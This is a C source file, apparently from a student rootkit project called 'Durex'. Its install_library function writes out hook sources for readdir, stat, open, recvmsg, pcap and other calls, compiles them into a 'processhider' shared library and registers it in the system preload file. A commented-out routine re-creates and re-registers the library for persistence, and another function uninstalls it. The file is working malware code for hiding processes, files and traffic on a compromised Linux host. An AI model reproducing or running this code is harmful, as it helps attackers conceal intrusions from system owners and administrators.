/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   library.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/08/14 01:44:46 by root              #+#    #+#             */
/*   Updated: 2018/10/01 11:10:44 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* system */
#include <stdlib.h>
/* remove */
#include <stdio.h>
/* execvp */
#include <unistd.h>
/* waitpid */
#include <sys/types.h>
#include <sys/wait.h>

#include "main.h"

int				install_library()
{
	char	*const files[] = { "gcc", "-Wall", "-fPIC", "-shared", "-o", DUREX_PROCESSHIDER_LIB,
							   DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_NEWFSTATAT_FILE,
							   DUREX_PCAP_FILE, DUREX_READDIR_FILE, DUREX_RECVMSG_FILE,
							   DUREX_RM_FILE, DUREX_XSTAT_FILE, DUREX_OPEN_FILE,
							 "-ldl", NULL };
	char	*const src[] = { NULL, NULL, NULL, NULL, NULL, NULL,
							 DUREX_FGETS_SRC, DUREX_LXSTAT_SRC, DUREX_NEWFSTATAT_SRC,
							 DUREX_PCAP_SRC, DUREX_READDIR_SRC, DUREX_RECVMSG_SRC,
							 DUREX_RM_SRC, DUREX_XSTAT_SRC, DUREX_OPEN_SRC };
	int			fd;
	size_t		ret;
	pid_t		pid;

	serverLog("[INFO] - Creating library files...");
	for (size_t i = 0; i < sizeof(src) / sizeof(*src); i++) {
		if (!src[i])
			continue ;
		fd = open(files[i], O_CREAT | O_TRUNC | O_WRONLY, 0644);
		if (fd < 0)
			return 0;
		ret = write(fd, src[i], mystrlen(src[i]));
		close(fd);
		if (ret != (size_t)mystrlen(src[i]))
			return 0;
	}
	pid = fork();
	if (pid == 0) {
		serverLog("[INFO] - Compiling library...");
		execvp(files[0], files);
		exit(-1);
	} else if (pid > 0) {
		int			status;
		waitpid(pid, &status, 0);
		if (!WIFEXITED(status)) {
			serverLog("[ERRO] - %d %d", status, WEXITSTATUS(status));
			return 0;
		}
	} else {
		return 0;
	}
	serverLog("[INFO] - Installing library...");
	ret = 0;
	fd = open(DUREX_PRELOAD, O_CREAT | O_TRUNC | O_WRONLY, 0600);
	if (fd >= 0) {
		ret = write(fd, DUREX_PROCESSHIDER_LIB, sizeof(DUREX_PROCESSHIDER_LIB));
		close(fd);
		if (ret != sizeof(DUREX_PROCESSHIDER_LIB))
			ret = 0;
	}
	for (size_t i = 0; i < sizeof(src) / sizeof(*src); i++) {
		if (src[i])
			remove(files[i]);
	}
	serverLog("[INFO] - Library well placed.");
	return ret;
}

void			check_library()
{
/* 	static time_t		t = 0; */
/* 	struct stat	s; */
/* 	int			fd; */
/* 	size_t		ret; */
/* 	FILE		*f; */
/* 	char		*line; */

/* 	if (time(NULL) - t > DUREX_PROCESSHIDER_CHECK_TIME) { */
/* 		t = time(NULL); */
/* 		if (stat(DUREX_PROCESSHIDER_LIB, &s) < 0) { */
/* 			serverLog(e.server.reporter, DUREX_PROCESSHIDER_LIB" not present. Recreating it..."); */
/* 			fd = open(DUREX_PROCESSHIDER_FIL, O_CREAT | O_TRUNC | O_WRONLY, 0644); */
/* 			if (fd < 0) */
/* 				return ; */
/* 			ret = write(fd, DUREX_PROCESSHIDER_SCR, sizeof(DUREX_PROCESSHIDER_SCR) - 1); */
/* 			close(fd); */
/* 			if (ret != sizeof(DUREX_PROCESSHIDER_SCR) - 1) { */
/* 				remove(DUREX_PROCESSHIDER_FIL); */
/* 				return ; */
/* 			} */
/* 			system("gcc -Wall -fPIC -shared -o "DUREX_PROCESSHIDER_LIB" "DUREX_PROCESSHIDER_FIL" -ldl"); */
/* 			remove(DUREX_PROCESSHIDER_FIL); */
/* 		} */
/* 		f = fopen(DUREX_PRELOAD, "a+"); */
/* 		if (f == NULL) */
/* 			return ; */
/* 		while (1) { */
/* 			line = NULL; */
/* 			ret = 0; */
/* 			ssize_t ret2 = getline(&line, &ret, f); */
/* 			if (ret2 <= 0) */
/* 				break ; */
/* 			if (strstr(line, DUREX_PROCESSHIDER_LIB)) */
/* 				return ; // lib in file, all OK ! */
/* 			free(line); */
/* 		} */
/* 		serverLog(e.server.reporter, DUREX_PROCESSHIDER_LIB" not present in "DUREX_PRELOAD". Fixing it!"); */
/* 		fwrite(DUREX_PROCESSHIDER_LIB, 1, sizeof(DUREX_PROCESSHIDER_LIB), f); */
/* 		fwrite("\n", 1, 1, f); */
/* 		fclose(f); */
/* 	} */
}

void			uninstall_library()
{
	serverLog("[INFO] - Removing library");
	remove(DUREX_PROCESSHIDER_LIB);
	remove(DUREX_PRELOAD);
}
